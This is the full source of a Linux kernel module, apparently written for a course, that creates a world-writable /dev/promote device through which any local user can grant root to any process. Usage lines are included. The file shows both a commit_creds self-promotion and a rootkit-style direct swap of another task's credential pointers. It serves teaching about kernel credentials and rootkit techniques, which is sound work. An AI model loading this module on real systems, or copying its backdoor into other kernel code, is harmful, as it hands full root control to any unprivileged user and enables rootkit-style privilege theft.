// SPDX-License-Identifier: GPL-2.0
/*
 * promote.c - PID-based Privilege Escalation Demo
 *
 * Creates /dev/promote (world-writable). Write a PID as text to promote
 * that process to UID/GID 0 (root).
 *
 * Two credential-modification paths are demonstrated:
 *
 *   Self-promotion (PID == current):
 *     prepare_creds() → modify → commit_creds()
 *     This is the proper kernel API for changing your own credentials.
 *
 *   Remote promotion (PID != current):
 *     find_task_by_vpid() → prepare_kernel_cred(NULL) → direct cred swap
 *     This is what a rootkit would do — there is no safe API for changing
 *     another process's credentials.
 *
 * Usage:
 *   insmod promote.ko
 *   echo $$ > /dev/promote        # promote current shell
 *   id                             # uid=0(root)
 *   # or use the promote_client binary
 *   rmmod promote
 *
 * WARNING: EDUCATIONAL USE ONLY. Do not use on production systems.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>
#include <linux/sched/signal.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Course Instructor");
MODULE_DESCRIPTION("PID-based privilege escalation demo — write a PID to /dev/promote");
MODULE_VERSION("1.0");

#define DEVICE_NAME "promote"
#define CLASS_NAME  "promote_class"
#define PID_BUF_LEN 32

static dev_t         dev_num;
static struct cdev   my_cdev;
static struct class  *dev_class;
static struct device *dev_device;

/* ═══════════════════════════════════════════════════════════════════
 *                    CREDENTIAL MODIFICATION
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Self-promotion: use the proper kernel credential API.
 *
 * prepare_creds() copies current->cred into a new mutable struct.
 * We modify it, then commit_creds() atomically replaces current->cred.
 */
static int promote_self(void)
{
	struct cred *new_cred;

	new_cred = prepare_creds();
	if (!new_cred)
		return -ENOMEM;

	new_cred->uid  = GLOBAL_ROOT_UID;
	new_cred->euid = GLOBAL_ROOT_UID;
	new_cred->suid = GLOBAL_ROOT_UID;
	new_cred->fsuid = GLOBAL_ROOT_UID;

	new_cred->gid  = GLOBAL_ROOT_GID;
	new_cred->egid = GLOBAL_ROOT_GID;
	new_cred->sgid = GLOBAL_ROOT_GID;
	new_cred->fsgid = GLOBAL_ROOT_GID;

	commit_creds(new_cred);
	return 0;
}

/*
 * Remote promotion: modify another process's credentials directly.
 *
 * commit_creds() only works on 'current', so there is no safe kernel
 * API for changing another process's credentials. We do it the way
 * a rootkit would:
 *   1. Find the task via pid_task(find_vpid(pid))
 *   2. Create root credentials with prepare_kernel_cred(NULL)
 *   3. Directly replace the task's real_cred and cred pointers
 *
 * This is racy and unsafe — a real kernel developer would never do this.
 * We use it here to demonstrate the technique.
 */
static int promote_remote(pid_t target_pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_real, *old;

	rcu_read_lock();
	task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	get_task_struct(task);
	rcu_read_unlock();

	/* prepare_kernel_cred(NULL) creates init_task credentials (root) */
	new_cred = prepare_kernel_cred(NULL);
	if (!new_cred) {
		put_task_struct(task);
		return -ENOMEM;
	}

	/*
	 * We need two references: one for real_cred, one for cred.
	 * prepare_kernel_cred returns refcount=1, so get one more.
	 */
	get_cred(new_cred);

	old_real = task->real_cred;
	old = task->cred;

	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);

	put_cred(old_real);
	put_cred(old);

	put_task_struct(task);
	return 0;
}

/* ═══════════════════════════════════════════════════════════════════
 *                      FILE OPERATIONS
 * ═══════════════════════════════════════════════════════════════════ */

static int promote_open(struct inode *inode, struct file *file)
{
	return 0;
}

static int promote_release(struct inode *inode, struct file *file)
{
	return 0;
}

/*
 * Write handler — accepts a PID as ASCII text (e.g. "1234\n").
 * Promotes the specified process to root.
 */
static ssize_t promote_write(struct file *file, const char __user *buf,
			     size_t count, loff_t *ppos)
{
	char kbuf[PID_BUF_LEN];
	pid_t target_pid;
	size_t len;
	int ret;

	len = min(count, (size_t)(PID_BUF_LEN - 1));

	if (copy_from_user(kbuf, buf, len))
		return -EFAULT;

	kbuf[len] = '\0';

	/* Strip trailing newline (echo adds one) */
	if (len > 0 && kbuf[len - 1] == '\n')
		kbuf[len - 1] = '\0';

	ret = kstrtoint(kbuf, 10, &target_pid);
	if (ret) {
		pr_info("promote: invalid PID '%s' from PID %d (%s)\n",
			kbuf, current->pid, current->comm);
		return -EINVAL;
	}

	if (target_pid <= 0)
		return -EINVAL;

	pr_info("promote: PID %d (%s) requests promotion of PID %d\n",
		current->pid, current->comm, target_pid);

	if (target_pid == current->pid) {
		ret = promote_self();
		if (ret)
			return ret;
		pr_info("promote: PID %d promoted to root (self, via commit_creds)\n",
			target_pid);
	} else {
		ret = promote_remote(target_pid);
		if (ret == -ESRCH) {
			pr_info("promote: PID %d not found\n", target_pid);
			return ret;
		}
		if (ret)
			return ret;
		pr_info("promote: PID %d promoted to root (remote, via direct cred swap)\n",
			target_pid);
	}

	return count;
}

static ssize_t promote_read(struct file *file, char __user *buf,
			    size_t count, loff_t *ppos)
{
	/* Nothing to read — write-only interface */
	return 0;
}

static const struct file_operations promote_fops = {
	.owner   = THIS_MODULE,
	.open    = promote_open,
	.release = promote_release,
	.read    = promote_read,
	.write   = promote_write,
};

/* ═══════════════════════════════════════════════════════════════════
 *         DEVICE NODE PERMISSIONS — make /dev/promote 0666
 * ═══════════════════════════════════════════════════════════════════ */

static char *promote_devnode(const struct device *dev, umode_t *mode)
{
	if (mode)
		*mode = 0666;
	return NULL;
}

/* ═══════════════════════════════════════════════════════════════════
 *                       MODULE INIT / EXIT
 * ═══════════════════════════════════════════════════════════════════ */

static int __init promote_init(void)
{
	int ret;

	ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
	if (ret < 0) {
		pr_err("promote: failed to allocate chrdev region: %d\n", ret);
		return ret;
	}

	cdev_init(&my_cdev, &promote_fops);
	my_cdev.owner = THIS_MODULE;

	ret = cdev_add(&my_cdev, dev_num, 1);
	if (ret < 0) {
		pr_err("promote: failed to add cdev: %d\n", ret);
		goto fail_cdev;
	}

	dev_class = class_create(CLASS_NAME);
	if (IS_ERR(dev_class)) {
		ret = PTR_ERR(dev_class);
		pr_err("promote: failed to create class: %d\n", ret);
		goto fail_class;
	}

	/* Set /dev/promote permissions to 0666 so any user can write */
	dev_class->devnode = promote_devnode;

	dev_device = device_create(dev_class, NULL, dev_num, NULL, DEVICE_NAME);
	if (IS_ERR(dev_device)) {
		ret = PTR_ERR(dev_device);
		pr_err("promote: failed to create device: %d\n", ret);
		goto fail_device;
	}

	pr_info("promote: created /dev/%s (write a PID to promote to root)\n",
		DEVICE_NAME);
	return 0;

fail_device:
	class_destroy(dev_class);
fail_class:
	cdev_del(&my_cdev);
fail_cdev:
	unregister_chrdev_region(dev_num, 1);
	return ret;
}

static void __exit promote_exit(void)
{
	device_destroy(dev_class, dev_num);
	class_destroy(dev_class);
	cdev_del(&my_cdev);
	unregister_chrdev_region(dev_num, 1);
	pr_info("promote: module unloaded\n");
}

module_init(promote_init);
module_exit(promote_exit);
